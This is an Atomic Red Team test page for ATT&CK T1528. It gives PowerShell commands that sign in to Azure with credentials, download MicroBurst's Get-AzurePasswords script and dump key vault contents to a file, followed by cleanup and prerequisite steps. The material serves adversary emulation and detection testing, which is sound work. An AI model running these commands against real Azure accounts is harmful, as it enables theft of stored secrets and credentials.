---
tags: [T1528, atomic_test]
filename: "[[T1528 - Steal Application Access Token]]"
---
# T1528 - Steal Application Access Token

## Atomic Test #1 - Azure - Dump All Azure Key Vaults with Microburst
Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.
See - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/

**Supported Platforms:** Iaas:azure


**auto_generated_guid:** 1b83cddb-eaa7-45aa-98a5-85fb0a8807ea





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| username | Azure AD username | string | |
| password | Azure AD password | string | T1082Az|
| output_file | File to dump results to | string | $env:temp&#92;T1528Test1.txt|
| subscription_id | Azure subscription id to search | string | |


#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
import-module "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
$Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
Connect-AzureRmAccount -Credential $Credential
Get-AzurePasswords -subscription '#{subscription_id}' > #{output_file}
cat #{output_file}
```

#### Cleanup Commands:
```powershell
remove-item #{output_file} -force -erroraction silentlycontinue
```



#### Dependencies:  Run with `powershell`!
##### Description: The Get-AzurePasswords script must exist in PathToAtomicsFolder\..\ExternalPayloads.
##### Check Prereq Commands:
```powershell
if (test-path "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"){exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
```
##### Description: The Azure RM module must be installed.
##### Check Prereq Commands:
```powershell
try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
```
##### Get Prereq Commands:
```powershell
Install-Module -Name AzureRM -Force -allowclobber
```
##### Description: The Azure module must be installed.
##### Check Prereq Commands:
```powershell
try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
```
##### Get Prereq Commands:
```powershell
Install-Module -Name Azure -Force -allowclobber
```




<br/>
